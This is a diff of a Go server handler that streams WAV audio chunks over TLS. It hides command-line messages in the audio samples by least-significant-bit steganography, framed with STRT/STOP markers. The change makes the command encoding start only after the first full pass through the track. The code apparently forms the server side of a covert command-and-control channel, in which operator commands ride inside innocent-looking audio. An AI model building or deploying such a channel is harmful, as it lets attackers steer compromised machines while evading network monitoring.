@@ -70,8 +70,9 @@ func invokeTlsListener(ctx context.Context, port string){
 
 	http.Serve(listener, mux)
 }
-
+var firstLoopDone string = "false"
 func handleChunk (w http.ResponseWriter, r *http.Request){
+	//fmt.Println("firstLoopDone ", firstLoopDone)
 	idxStr := strings.TrimPrefix(r.URL.Path, "/api/v1/sample/chunk/")
 	n, err := strconv.Atoi(idxStr)
 	if err != nil {
@@ -112,92 +113,95 @@ func handleChunk (w http.ResponseWriter, r *http.Request){
 	if byteOffset+ChunkSize > totalTrackBytes {
 		num =copy(chunk, baseAudioTrack[byteOffset:totalTrackBytes])
 		isLastChunk="true"
+		firstLoopDone="true"
 	}else{
 		num =copy(chunk, baseAudioTrack[byteOffset:byteOffset+ChunkSize])
 	}
 
 	//*********--encode message in the current chunk--******************//
 	//---code for byte to bit conversion of cli commands
-	
-	select {
-	case cmd := <-cliMessageChan:
-		command = cmd
-		if len(command) > 0 {
-			command = "STRT"+command+"STOP"
+	if firstLoopDone == "true"{
+		select {
+		case cmd := <-cliMessageChan:
+			command = cmd
+			if len(command) > 0 {
+				command = "STRT"+command+"STOP"
+			}
+			
+			if len(pendingCommand)>0{
+				command = pendingCommand[:min(len(pendingCommand), cmd_len_threshold)]+command
+				pendingCommand = pendingCommand[min(len(pendingCommand), cmd_len_threshold):]
+			}
+			if len(command)>cmd_len_threshold{
+				pendingCommand += command[cmd_len_threshold:]
+				command = command[:cmd_len_threshold]
+			}
+
+		default:
+			if len(pendingCommand)>0{
+				command = pendingCommand[:min(len(pendingCommand), cmd_len_threshold)]+command
+				pendingCommand = pendingCommand[min(len(pendingCommand), cmd_len_threshold):]					
+				//fmt.Printf("Injecting payload (%d characters)...\n", len(command)+8)
+				goto label1
+				//ensures pending msg gets sent, when there's no cli message but there's pending msg
+			}
+
+			//dont go through the whole thing of encoding, if we dont have any message to be sent.
+			w.Header().Set("Content-Type", "audio/wav")
+			w.Header().Set("Content-Length", strconv.Itoa(len(chunk[:num])))
+			w.Header().Set("Cache-Control", "no-store")
+			w.Header().Set("X-Last-Chunk", isLastChunk)
+			w.Header().Set("Accept-Ranges", "bytes")
+			w.Write(chunk[:num])
+
+			byteOffset = byteOffset + ChunkSize;
+			return
+		}
+label1 :
+
+		var cmd_bitstring []string 
+		for _, char := range command{
+			if echo_to_stdout=="on"{
+				fmt.Println("individual byte= ", char, " char= ", string(char)," bitstring ", fmt.Sprintf("%08b", char) )
+			}
+			cmd_bitstring = append(cmd_bitstring, fmt.Sprintf("%08b", char))
 		}
 		
-		if len(pendingCommand)>0{
-			command = pendingCommand[:min(len(pendingCommand), cmd_len_threshold)]+command
-			pendingCommand = pendingCommand[min(len(pendingCommand), cmd_len_threshold):]
-		}
-		if len(command)>cmd_len_threshold{
-			pendingCommand += command[cmd_len_threshold:]
-			command = command[:cmd_len_threshold]
-		}
+		//----code to inject LSB from cmd_bitstring array into audio stream.
+		cmd_bitIndex :=0
+		cmd_charIndex :=0
+		var audio_stegd_bytes []byte
 
-	default:
-		if len(pendingCommand)>0{
-			command = pendingCommand[:min(len(pendingCommand), cmd_len_threshold)]+command
-			pendingCommand = pendingCommand[min(len(pendingCommand), cmd_len_threshold):]					
-			//fmt.Printf("Injecting payload (%d characters)...\n", len(command)+8)
-			goto label1
-			//ensures pending msg gets sent, when there's no cli message but there's pending msg
-		}
-
-		//dont go through the whole thing of encoding, if we dont have any message to be sent.
-		w.Header().Set("Content-Type", "audio/wav")
-		w.Header().Set("Content-Length", strconv.Itoa(len(chunk[:num])))
-		w.Header().Set("Cache-Control", "no-store")
-		w.Header().Set("X-Last-Chunk", isLastChunk)
-		w.Header().Set("Accept-Ranges", "bytes")
-		w.Write(chunk[:num])
-
-		byteOffset = byteOffset + ChunkSize;
-		return
-	}
-label1 :
-	var cmd_bitstring []string 
-	for _, char := range command{
 		if echo_to_stdout=="on"{
-			fmt.Println("individual byte= ", char, " char= ", string(char)," bitstring ", fmt.Sprintf("%08b", char) )
+			fmt.Println("Chunk length = ", len(chunk))
+			fmt.Printf("Injecting payload (%d characters)...\n", len(command))
 		}
-		cmd_bitstring = append(cmd_bitstring, fmt.Sprintf("%08b", char))
-	}
-	
-	//----code to inject LSB from cmd_bitstring array into audio stream.
-	cmd_bitIndex :=0
-	cmd_charIndex :=0
-	var audio_stegd_bytes []byte
 
-	if echo_to_stdout=="on"{
-		fmt.Println("Chunk length = ", len(chunk))
-		fmt.Printf("Injecting payload (%d characters)...\n", len(command))
-	}
-
-	for _, aud_byte := range chunk{
-		if cmd_charIndex == len(command) {
-			if echo_to_stdout=="on"{
-				fmt.Println("stegged bs length ",len(audio_stegd_bytes), "\nstegged bs ", audio_stegd_bytes)
+		for _, aud_byte := range chunk{
+			if cmd_charIndex == len(command) {
+				if echo_to_stdout=="on"{
+					fmt.Println("stegged bs length ",len(audio_stegd_bytes), "\nstegged bs ", audio_stegd_bytes)
+				}
+				break
 			}
-			break
+
+			ival, _ := strconv.Atoi(string(cmd_bitstring[cmd_charIndex][cmd_bitIndex]))
+			aud_byte = aud_byte & 0xFE //0xFE is 11111110. So we clear the LSB
+			aud_byte = aud_byte | byte(ival)
+
+			audio_stegd_bytes= append(audio_stegd_bytes, aud_byte)
+
+			cmd_bitIndex++
+			if cmd_bitIndex==8{
+				cmd_charIndex ++
+				cmd_bitIndex =0
+			}
+
 		}
 
-		ival, _ := strconv.Atoi(string(cmd_bitstring[cmd_charIndex][cmd_bitIndex]))
-		aud_byte = aud_byte & 0xFE //0xFE is 11111110. So we clear the LSB
-		aud_byte = aud_byte | byte(ival)
-
-		audio_stegd_bytes= append(audio_stegd_bytes, aud_byte)
-
-		cmd_bitIndex++
-		if cmd_bitIndex==8{
-			cmd_charIndex ++
-			cmd_bitIndex =0
-		}
-
+		//*********-------------------end------------------*****************//
+		copy(chunk[:cmd_charIndex*8], audio_stegd_bytes[:cmd_charIndex*8])
 	}
-
-	//*********-------------------end------------------*****************//
-	copy(chunk[:cmd_charIndex*8], audio_stegd_bytes[:cmd_charIndex*8])
 	w.Header().Set("Content-Type", "audio/wav")
 	w.Header().Set("Content-Length", strconv.Itoa(len(chunk[:num])))
 	w.Header().Set("Cache-Control", "no-store")
